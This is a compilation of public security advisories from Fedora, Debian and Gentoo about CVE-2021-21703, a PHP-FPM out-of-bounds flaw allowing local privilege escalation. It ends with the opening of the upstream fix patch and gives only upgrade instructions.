* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R.mbox.gz?message=JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R/#JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R)

# [SECURITY] Fedora 34 Update: php-7.4.25-1.fc34

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

28 Oct
2021

28 Oct
'21

8:32 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2021-9f68f5f752
2021-10-28 19:30:40.168129
--------------------------------------------------------------------------------

Name : php
Product : Fedora 34
Version : 7.4.25
Release : 1.fc34
URL : <http://www.php.net/>
Summary : PHP scripting language for creating dynamic web sites
Description :
PHP is an HTML-embedded scripting language. PHP attempts to make it
easy for developers to write dynamically generated web pages. PHP also
offers built-in database integration for several commercial and
non-commercial database management systems, so writing a
database-enabled webpage with PHP is fairly simple. The most common
use of PHP coding is probably as a replacement for CGI scripts.

--------------------------------------------------------------------------------
Update Information:

\*\*PHP version 7.4.25\*\* (21 Oct 2021) \*\*DOM:\*\* \* Fixed bug php#81433
(DOMElement::setIdAttribute() called twice may remove ID). (Viktor Volkov)
\*\*FFI:\*\* \* Fixed bug php#79576 ("TYPE \*" shows unhelpful message when type is
not defined). (Dmitry) \*\*Fileinfo:\*\* \* Fixed bug php#78987 (High memory usage
during encoding detection). (Anatol) \*\*Filter:\*\* \* Fixed bug php#61700
(FILTER\_FLAG\_IPV6/FILTER\_FLAG\_NO\_PRIV|RES\_RANGE failing). (cmb, Nikita)
\*\*FPM:\*\* \* Fixed bug php#81026 (PHP-FPM oob R/W in root process leading to
privilege escalation) (\*\*CVE-2021-21703\*\*). (Jakub Zelenka) \*\*SPL:\*\* \* Fixed
bug php#80663 (Recursive SplFixedArray::setSize() may cause double-free). (cmb,
Nikita, Tyson Andre) \*\*Streams:\*\* \* Fixed bug php#81475 (stream\_isatty emits
warning with attached stream wrapper). (cmb) \*\*XML:\*\* \* Fixed bug php#70962
(XML\_OPTION\_SKIP\_WHITE strips embedded whitespace). (Aliaksandr Bystry, cmb)
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Oct 20 2021 Remi Collet remi@remirepo.net - 7.4.25-1
- Update to 7.4.25 - <http://www.php.net/releases/7_4_24.php>
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2016535 - CVE-2021-21703 php: Local privilege escalation via PHP-FPM
<https://bugzilla.redhat.com/show_bug.cgi?id=2016535>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2021-9f68f5f752' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R/#JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from www.debian.org_bd3f10d3_20250114_195335.html ===


---

[[Date Prev](msg00176.html)][[Date Next](msg00178.html)]
[[Thread Prev](msg00176.html)][[Thread Next](msg00178.html)]
[[Date Index](maillist.html#00177)]
[[Thread Index](threads.html#00177)]

# [SECURITY] [DSA 4992-1] php7.4 security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4992-1] php7.4 security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Mon, 25 Oct 2021 20:20:43 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1mf6SZ-00013a-ER%40seger.debian.org) [E1mf6SZ-00013a-ER@seger.debian.org](msg00177.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4992-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso
October 25, 2021                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : php7.4
CVE ID         : CVE-2021-21703
Debian Bug     : 997003

An out-of-bounds read and write flaw was discovered in the PHP-FPM code,
which could result in escalation of privileges from local unprivileged
user to the root user.

For the stable distribution (bullseye), this problem has been fixed in
version 7.4.25-1+deb11u1.

We recommend that you upgrade your php7.4 packages.

For the detailed security status of php7.4 please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/php7.4>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmF3EQhfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0Sirg/9FEi2498AwrLJFd38x/N9F3SndRQXFEyHFoi8vBW7HEurAbPqjLodWCqU
ltk+AkOVWS8D1qRYAb8HM8ZUxF6KXZsV6rOQ4W6Gh5qX1I3pIt6LZBWO7ez/Sh8w
QTGGPdmrP+Gr8RoTgKHOHxgNc8kgV7gAygdp+ImhylutXHJkwZNnhOmJjRjnzaQy
nEH5mPsTTT5YS2W5a0qjQoTK44oGPHZDLq6KtZ6kdwdW9y5L4cToyghYfjw206HD
rLlcMoBi7LmQfXm6Ssqi6NmTMNQjyPWKWaBmolRFPhod4T3FMxxWJ21zKpAd3ezp
T+LKXlIGXNfgECbZG2xc0045WKPL5RXHKnPrFtfoXQu6PkClrm2PChJHJ9KEGKmx
hWCBl5q+V2+jJSbpRsUsKOiTZ7IqphyvF5kqleUrFg85ReNSWUDbG/bzB6WORwdC
OF0uCQK5nzwHqhp3i3St61jYUdjCe2bstjcZHjiw5X5o2v5EOC0aLHufiDmtaq2G
7vMHGnrd3RHRMA2aPd62xee0o6jAhycmyRr6u4X9BFgoNWxlD57gK2RuH4MC+Wb5
wUBo74Fy74Z+Bw4ynXR6tHz7rHPvwpRC+7hDATEcEBqE4t72Z4fedxYciLOMwo7Z
TZuFZoR3ACOKiOx4z0gnA/X3OG9I49kQrCuTltecdCm3LIs+l+8=
=kDjO
-----END PGP SIGNATURE-----

```

---



=== Content from security.gentoo.org_4cef4ca4_20250114_195334.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# PHP: Multiple Vulnerabilities — GLSA **202209-20**

Multiple vulnerabilities have been discovered in PHP, the worst of which could result in local root privilege escalation.

### Affected packages

| Package | **dev-lang/php** on all architectures |
| --- | --- |
| Affected versions | < **7.4.30**< **8.0.23**< **8.1.8** |
| Unaffected versions | >= **7.4.30**>= **8.0.23**>= **8.1.8** |

### Background

PHP is a widely-used general-purpose scripting language that is especially suited for Web development and can be embedded into HTML.

### Description

Multiple vulnerabilities have been discovered in PHP. Please review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All PHP 7.4 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-7.4.30:7.4"

```

All PHP 8.0 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-8.0.23:8.0"

```

All PHP 8.1 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-8.1.8:8.1"

```
### References

* [CVE-2021-21703](https://nvd.nist.gov/vuln/detail/CVE-2021-21703)
* [CVE-2021-21704](https://nvd.nist.gov/vuln/detail/CVE-2021-21704)
* [CVE-2021-21705](https://nvd.nist.gov/vuln/detail/CVE-2021-21705)
* [CVE-2021-21708](https://nvd.nist.gov/vuln/detail/CVE-2021-21708)
* [CVE-2022-31625](https://nvd.nist.gov/vuln/detail/CVE-2022-31625)
* [CVE-2022-31626](https://nvd.nist.gov/vuln/detail/CVE-2022-31626)
* [CVE-2022-31627](https://nvd.nist.gov/vuln/detail/CVE-2022-31627)

**Release date**

September 29, 2022

**Latest revision**

September 29, 2022: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [799776](https://bugs.gentoo.org/show_bug.cgi?id=799776)
* [810526](https://bugs.gentoo.org/show_bug.cgi?id=810526)
* [819510](https://bugs.gentoo.org/show_bug.cgi?id=819510)
* [833585](https://bugs.gentoo.org/show_bug.cgi?id=833585)
* [850772](https://bugs.gentoo.org/show_bug.cgi?id=850772)
* [857054](https://bugs.gentoo.org/show_bug.cgi?id=857054)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from gist.github.com_a03c8d1c_20250115_115344.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=64&v=4)](/smalyshev)

# [smalyshev](/smalyshev)/**[fpm\_scoreboard\_proc\_oob\_fix\_v4.patch.patch.txt](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7)** Secret

Created
October 11, 2021 04:53

Show Gist options

* [Download ZIP](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7/archive/de9f85b39bb6f6a7e5e34821f2713f1a18aec072.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7.js&quot;&gt;&lt;/script&gt;
* Save smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7 to your computer and use it in GitHub Desktop.

[Code](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7)
[Revisions
1](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7.js&quot;&gt;&lt;/script&gt;

Save smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7 to your computer and use it in GitHub Desktop.

[Download ZIP](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7/archive/de9f85b39bb6f6a7e5e34821f2713f1a18aec072.zip)

 [Raw](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7/raw/de9f85b39bb6f6a7e5e34821f2713f1a18aec072/fpm_scoreboard_proc_oob_fix_v4.patch.patch.txt)

[**fpm\_scoreboard\_proc\_oob\_fix\_v4.patch.patch.txt**](#file-fpm_scoreboard_proc_oob_fix_v4-patch-patch-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From c600ec7bcf2696882ffe961e7b158c67aa2e7277 Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: Jakub Zelenka <bukka@php.net> |
|  | Date: Sat, 2 Oct 2021 22:53:41 +0100 |
|  | Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to |
|  | priv escalatio) |
|  |  |
|  | The main change is to store scoreboard procs directly to the variable sized |
|  | array rather than indirectly through the pointer. |
|  | --- |
|  | sapi/fpm/fpm/fpm\_children.c | 14 ++--- |
|  | sapi/fpm/fpm/fpm\_request.c | 4 +- |
|  | sapi/fpm/fpm/fpm\_scoreboard.c | 106 ++++++++++++++++++++------------- |
|  | sapi/fpm/fpm/fpm\_scoreboard.h | 11 ++-- |
|  | sapi/fpm/fpm/fpm\_status.c | 4 +- |
|  | sapi/fpm/fpm/fpm\_worker\_pool.c | 2 +- |
|  | 6 files changed, 81 insertions(+), 60 deletions(-) |
|  |  |
|  | diff --git a/sapi/fpm/fpm/fpm\_children.c b/sapi/fpm/fpm/fpm\_children.c |
|  | index fd121372f3..912f77c11a 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_children.c |
|  | +++ b/sapi/fpm/fpm/fpm\_children.c |
|  | @@ -246,7 +246,7 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  |
|  | fpm\_child\_unlink(child); |
|  |  |
|  | - fpm\_scoreboard\_proc\_free(wp->scoreboard, child->scoreboard\_i); |
|  | + fpm\_scoreboard\_proc\_free(child); |
|  |  |
|  | fpm\_clock\_get(&tv1); |
|  |  |
|  | @@ -256,9 +256,9 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  | if (!fpm\_pctl\_can\_spawn\_children()) { |
|  | severity = ZLOG\_DEBUG; |
|  | } |
|  | - zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  | + zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  | } else { |
|  | - zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  | + zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  | } |
|  |  |
|  | fpm\_child\_close(child, 1 /\* in event\_loop \*/); |
